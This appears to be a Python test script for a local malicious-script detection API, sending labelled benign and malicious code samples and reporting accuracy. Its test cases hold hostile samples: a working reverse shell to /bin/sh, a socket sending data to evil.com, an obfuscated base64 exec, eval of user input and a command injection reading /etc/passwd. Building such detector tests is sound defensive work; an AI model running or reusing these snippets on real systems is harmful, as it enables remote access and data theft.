#!/usr/bin/env python3
"""Test detection improvement with features."""

import requests
import os
import sys

# Load environment variables
from dotenv import load_dotenv
load_dotenv()

API_KEY = os.getenv("SCRIPTGUARD_API_KEY", "test-api-key")
BASE_URL = "http://localhost:8000"

test_cases = [
    {
        "name": "Simple benign print",
        "code": 'print("Hello World")',
        "expected": "benign",
        "description": "Basic print statement - should be clearly benign"
    },
    {
        "name": "Simple benign function",
        "code": '''
def greet(name):
    return f"Hello, {name}!"

print(greet("Alice"))
''',
        "expected": "benign",
        "description": "Simple function - should be benign"
    },
    {
        "name": "Obfuscated malicious eval",
        "code": 'exec(__import__("base64").b64decode("aW1wb3J0IG9z"))',
        "expected": "malicious",
        "description": "Base64 obfuscated exec - should detect as malicious"
    },
    {
        "name": "Network reverse shell",
        "code": '''
import socket
import subprocess

s = socket.socket()
s.connect(('192.168.1.1', 4444))
subprocess.call(['/bin/sh', '-i'], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
''',
        "expected": "malicious",
        "description": "Classic reverse shell - should be malicious"
    },
    {
        "name": "Socket usage malicious",
        "code": '''
import socket
s = socket.socket()
s.connect(("evil.com", 4444))
s.send(b"data")
''',
        "expected": "malicious",
        "description": "Suspicious socket connection"
    },
    {
        "name": "Legitimate network tool",
        "code": '''
import requests

response = requests.get('https://api.example.com/data')
print(response.json())
''',
        "expected": "benign",
        "description": "Normal HTTP request - should be benign"
    },
    {
        "name": "Dangerous eval with input",
        "code": '''
user_input = input("Enter code: ")
eval(user_input)
''',
        "expected": "malicious",
        "description": "Eval with user input - dangerous pattern"
    },
    {
        "name": "File operations benign",
        "code": '''
with open('data.txt', 'r') as f:
    content = f.read()
print(content)
''',
        "expected": "benign",
        "description": "Normal file reading"
    },
    {
        "name": "Command injection",
        "code": '''
import os
user = input("Username: ")
os.system(f"cat /etc/passwd | grep {user}")
''',
        "expected": "malicious",
        "description": "Command injection vulnerability"
    },
    {
        "name": "Legitimate subprocess",
        "code": '''
import subprocess
result = subprocess.run(['ls', '-la'], capture_output=True)
print(result.stdout.decode())
''',
        "expected": "benign",
        "description": "Safe subprocess usage with fixed arguments"
    },
]


def test_detection():
    """Test detection quality with features."""
    print("=" * 70)
    print("TESTING DETECTION QUALITY WITH FEATURES")
    print("=" * 70)
    print(f"\nAPI: {BASE_URL}")
    print(f"Total tests: {len(test_cases)}\n")

    # Check if API is running
    try:
        health = requests.get(f"{BASE_URL}/health", timeout=5)
        if health.status_code != 200:
            print("❌ API is not responding correctly")
            print("   Start API first: python start_api.py")
            return 1
    except requests.exceptions.RequestException as e:
        print(f"❌ Cannot connect to API: {e}")
        print("   Start API first: python start_api.py")
        return 1

    correct = 0
    total = len(test_cases)
    results = []

    for i, test in enumerate(test_cases, 1):
        print(f"Test {i}/{total}: {test['name']}")
        print(f"  Description: {test['description']}")

        try:
            response = requests.post(
                f"{BASE_URL}/analyze",
                headers={
                    "X-API-Key": API_KEY,
                    "Content-Type": "application/json"
                },
                json={
                    "script_content": test["code"],
                    "include_rag": True
                },
                timeout=30
            )

            if response.status_code == 200:
                data = response.json()
                is_malicious = data["is_malicious"]
                confidence = data["confidence"]
                features = data.get("feature_analysis", {})

                predicted = "malicious" if is_malicious else "benign"
                is_correct = predicted == test["expected"]

                if is_correct:
                    correct += 1
                    print(f"  ✅ CORRECT: {predicted} (confidence: {confidence:.2f})")
                else:
                    print(f"  ❌ WRONG: predicted {predicted}, expected {test['expected']} (confidence: {confidence:.2f})")

                # Show feature analysis if available
                if features:
                    entropy = features.get('entropy', 0)
                    dangerous = features.get('has_dangerous_apis', False)
                    obfuscated = features.get('has_obfuscation', False)
                    dangerous_patterns = features.get('dangerous_patterns', [])

                    print(f"  Features: entropy={entropy:.2f}, "
                          f"dangerous={dangerous}, "
                          f"obfuscated={obfuscated}")

                    if dangerous_patterns:
                        print(f"    Dangerous APIs: {dangerous_patterns}")

                    api_usage = features.get('api_usage', {})
                    if any(api_usage.values()):
                        active_apis = [k for k, v in api_usage.items() if v]
                        print(f"    API Usage: {', '.join(active_apis)}")
                else:
                    print(f"  ⚠️  No feature analysis (features may not be indexed yet)")

                results.append({
                    "name": test["name"],
                    "correct": is_correct,
                    "predicted": predicted,
                    "expected": test["expected"],
                    "confidence": confidence
                })

            else:
                print(f"  ❌ API ERROR: {response.status_code} - {response.text[:100]}")
                results.append({
                    "name": test["name"],
                    "correct": False,
                    "error": f"HTTP {response.status_code}"
                })

        except Exception as e:
            print(f"  ❌ EXCEPTION: {e}")
            results.append({
                "name": test["name"],
                "correct": False,
                "error": str(e)
            })

        print()

    # Summary
    print("=" * 70)
    print("SUMMARY")
    print("=" * 70)
    print(f"\nAccuracy: {correct}/{total} ({correct/total*100:.1f}%)")

    # Show failures
    failures = [r for r in results if not r["correct"]]
    if failures:
        print(f"\nFailed tests ({len(failures)}):")
        for fail in failures:
            print(f"  ❌ {fail['name']}")
            if "error" in fail:
                print(f"     Error: {fail['error']}")
            else:
                print(f"     Predicted: {fail['predicted']}, Expected: {fail['expected']}")

    # Evaluation
    print("\n" + "=" * 70)
    if correct == total:
        print("🎉 EXCELLENT: Perfect detection!")
        print("=" * 70)
        return 0
    elif correct >= total * 0.8:
        print("✅ GOOD: Detection quality is acceptable (≥80%)")
        print("=" * 70)
        return 0
    elif correct >= total * 0.6:
        print("⚠️  FAIR: Detection quality needs improvement (60-80%)")
        print("=" * 70)
        return 1
    else:
        print("❌ POOR: Detection quality is inadequate (<60%)")
        print("   Consider:")
        print("   - Re-training the model with better data")
        print("   - Adjusting feature filters and thresholds")
        print("   - Reviewing false positive/negative patterns")
        print("=" * 70)
        return 2


def main():
    """Main entry point."""
    try:
        return test_detection()
    except KeyboardInterrupt:
        print("\n\nTest interrupted by user")
        return 130
    except Exception as e:
        print(f"\n❌ Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        return 3


if __name__ == "__main__":
    sys.exit(main())
